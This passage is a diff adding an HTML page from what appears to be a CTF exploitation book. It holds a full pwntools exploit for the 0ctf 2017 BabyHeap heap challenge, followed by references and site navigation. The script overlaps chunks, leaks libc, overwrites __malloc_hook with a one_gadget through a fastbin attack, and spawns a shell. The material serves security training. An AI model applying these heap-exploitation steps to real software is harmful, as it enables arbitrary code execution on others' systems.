+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cont</span><span class="p">)))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="c1">#fill(0, &quot;A&quot;*16)</span>
+<span class="c1">#fill(1, &quot;A&quot;*16)</span>
+<span class="c1">#fill(2, &quot;A&quot;*16)</span>
+<span class="c1">#fill(3, &quot;A&quot;*16)</span>
+<span class="c1">#fill(4, &quot;A&quot;*128)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="c1">#fill(1, &quot;B&quot;*16)</span>
+<span class="c1">#fill(2, &quot;C&quot;*16)</span>
+<span class="c1">#fill(4, &quot;D&quot;*16)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="c1">#fill(5, &quot;A&quot;*128)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>          <span class="c1"># 0x3c4b78 = leak - libc</span>
+<span class="n">__malloc_hook</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4b10</span>    <span class="c1"># readelf -s libc.so.6 | grep __malloc_hook@</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak =&gt; 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">leak</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc =&gt; 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">libc</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;__malloc_hook =&gt; 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">__malloc_hook</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;one_gadget =&gt; 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">one_gadget</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4afd</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div></p>
+<h2 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">0ctf Quals 2017 - BabyHeap2017</a></li>
+<li><a href="https://github.com/shellphish/how2heap">how2heap</a></li>
+</ul>
+                
+                  
+                
+              
+              
+                
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                RHme3 Exploitation
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                9447CTF2015 Search-Engine
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="http://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.02434462.js"></script>
+      
+        
+        
+          
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
+      
+        <script src="../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
